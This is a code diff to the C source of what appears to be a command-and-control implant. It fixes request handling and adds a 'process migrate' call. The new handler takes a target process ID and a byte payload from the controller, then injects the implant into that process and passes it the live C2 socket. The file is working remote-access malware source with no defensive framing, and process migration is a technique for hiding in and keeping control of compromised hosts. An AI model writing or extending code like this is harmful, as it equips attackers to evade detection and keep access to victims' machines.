@@ -22,12 +22,16 @@
  * SOFTWARE.
  */
 
+#ifndef _PROCESS_H_
+#define _PROCESS_H_
+
 #include <sigar.h>
 
 #include <api.h>
 #include <c2.h>
 #include <tlv_types.h>
 #include <tlv.h>
+#include <migrate.h>
 
 #define PROCESS_BASE 2
 
@@ -43,9 +47,13 @@
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
                        PROCESS_BASE, \
                        API_CALL + 2)
+#define PROCESS_MIGRATE \
+        TLV_TAG_CUSTOM(API_CALL_STATIC, \
+                       PROCESS_BASE, \
+                       API_CALL + 3)
 
-#define TLV_TYPE_PID_STATE TLV_TYPE_CUSTOM(TLV_TYPE_PID, API_TYPE)
-#define TLV_TYPE_PID_CPU   TLV_TYPE_CUSTOM(TLV_TYPE_PID, API_TYPE + 1)
+#define TLV_TYPE_PID_STATE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE)
+#define TLV_TYPE_PID_CPU   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PROCESS_BASE, API_TYPE + 1)
 
 static tlv_pkt_t *process_list(c2_t *c2)
 {
@@ -108,7 +116,7 @@ static tlv_pkt_t *process_kill(c2_t *c2)
     int pid;
     int status;
 
-    tlv_pkt_get_int(c2->tlv_pkt, TLV_TYPE_PID, &pid);
+    tlv_pkt_get_int(c2->request, TLV_TYPE_PID, &pid);
 
     if ((status = sigar_proc_kill(pid, 9)) != SIGAR_OK)
     {
@@ -130,9 +138,32 @@ static tlv_pkt_t *process_get_pid(c2_t *c2)
     return result;
 }
 
+static tlv_pkt_t *process_migrate(c2_t *c2)
+{
+    int migrate_size;
+    unsigned char *migrate;
+    pid_t migrate_pid;
+
+    tlv_pkt_get_int(c2->request, TLV_TYPE_PID, &migrate_pid);
+
+    if ((migrate_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_MIGRATE, &migrate)) >= 0)
+    {
+        if (migrate_init(migrate_pid, migrate_size, migrate, c2->net->sock) >= 0)
+        {
+            free(migrate);
+            return api_craft_tlv_pkt(API_CALL_QUIT);
+        }
+    }
+
+    return api_craft_tlv_pkt(API_CALL_FAIL);
+}
+
 void register_process_api_calls(api_calls_t **api_calls)
 {
     api_call_register(api_calls, PROCESS_LIST, process_list);
     api_call_register(api_calls, PROCESS_KILL, process_kill);
     api_call_register(api_calls, PROCESS_GET_PID, process_get_pid);
+    api_call_register(api_calls, PROCESS_MIGRATE, process_migrate);
 }
+
+#endif
